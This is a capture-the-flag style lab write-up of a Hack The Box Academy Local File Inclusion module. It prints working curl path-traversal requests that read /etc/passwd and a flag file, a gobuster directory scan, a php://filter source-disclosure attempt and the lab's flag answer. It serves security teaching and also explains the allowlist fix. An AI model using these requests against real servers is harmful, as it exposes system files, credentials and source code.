# HTB Academy — File Inclusion: Local File Inclusion (18.18%)

**Platform:** Hack The Box Academy (free Tier 0 module)
**Module:** File Inclusion
**Section completed:** Local File Inclusion (Section 3/11)
**Section started:** PHP Filters (Section 4/11) — question still open
**Vulnerability Type:** Local File Inclusion (LFI) — unsanitised user input passed to a file-include function
**Difficulty:** Easy (Tier 0)
**Progress:** 9.09% → **18.18%** on 28 November 2026
**Account:** Arbaz Ahmed Naveed (@cybersafetywitharbaz)

> No screenshots available from this run — the module was solved from a
> PwnBox terminal during browser task 49aec676 (28 Nov 2026, 2h16m).

## Task

Exploit Local File Inclusion in the module's PHP application to read
files from the target server: first the local user list, then the
flag file. Then begin the PHP Filters section.

## Solution

Target: `154.57.164.74:37607` — the application takes a `language`
parameter, e.g. `index.php?language=...`.

### Local File Inclusion — user list

Read `/etc/passwd` through the LFI:

```bash
curl "http://154.57.164.74:37607/index.php?language=../../../../etc/passwd"
```

The returned passwd file listed the local users, including
`bin/backup/barry`. The question asked for the local username found
this way.

**Answer submitted: `barry` — Success.**

### Local File Inclusion — flag file

Read the flag file through the same LFI:

```bash
curl "http://154.57.164.74:37607/index.php?language=../../../../usr/share/flags/flag.txt"
```

**Answer submitted: `HTB{n3v3r_tru$t_u$3r_!nput}` — Success.**

Section marked complete on the module page.

### PHP Filters — started, question NOT completed

Section 4/11, PHP Filters:

- Directory brute-force with gobuster found a new file:

  ```bash
  gobuster dir -u http://154.57.164.74:37607 -w <wordlist> -x php
  # found: /configure.php  (302 redirect to /index.php)
  ```

- Tried to read `configure.php` source with the PHP filter wrapper:

  ```bash
  curl "http://154.57.164.74:37607/index.php?language=php://filter/convert.base64-encode/resource=configure.php"
  ```

- The request repeatedly returned the **normal homepage**
  (2,278 / 2,822 bytes, no base64 blob, no `HTB` flag) — the filter
  did not return the file contents. The question was **not completed**
  and remains open for the next session.

## Practical Explanation

- **LFI = the application trusts your path.** When user input flows
  straight into an `include()` / `require()` / `fopen()` call, `../`
  sequences walk out of the intended directory. `/etc/passwd` is the
  classic proof-of-concept because it exists on every Linux box and
  lists users — here it gave `barry`.
- **Once LFI works, any readable file is in reach.** The same
  parameter that read `/etc/passwd` also read
  `/usr/share/flags/flag.txt`. In a real application the next targets
  would be config files, credentials, and source code.
- **The flag says the fix: `HTB{n3v3r_tru$t_u$3r_!nput}`** — never
  trust user input. The defence is an allowlist of permitted files
  (or mapping a language code to a fixed filename), never passing raw
  user input to a file function.
- **PHP filters need the right parameter.** `php://filter` only works
  when the vulnerable parameter is actually used in an include — if
  the application redirects or ignores the value for that file, the
  wrapper returns the default page instead of the encoded source.
  The 302 to `/index.php` for `/configure.php` suggests the app
  handles that file specially; the filter attempt needs a different
  approach next session (try the parameter against other files, or
  the direct `configure.php` path with the filter).

## Lessons Learned

- `../../../../etc/passwd` is the first LFI test for a reason — it
  confirms the vulnerability and reveals usernames in one request.
- Count the `../` depth from the application's working directory;
  too few won't escape, too many are harmless (they clamp at `/`).
- A failed filter attempt is still information: the homepage response
  (and its exact byte sizes) shows the parameter was ignored for that
  file, so the next try should change the file or the approach, not
  repeat the same request.
- `gobuster -x php` is worth running early — knowing the file list
  (`configure.php`) shapes every later test.

## Status

Module at **18.18%** after the 28 Nov 2026 run (Local File Inclusion
complete). **PHP Filters (Section 4/11) is started but its question
is still open** — the `php://filter` attempt returned the homepage
instead of base64 source; retry in the next PwnBox session with a
different file or approach. No answers were submitted from this
write-up session — all answers were submitted during the live
browser run.
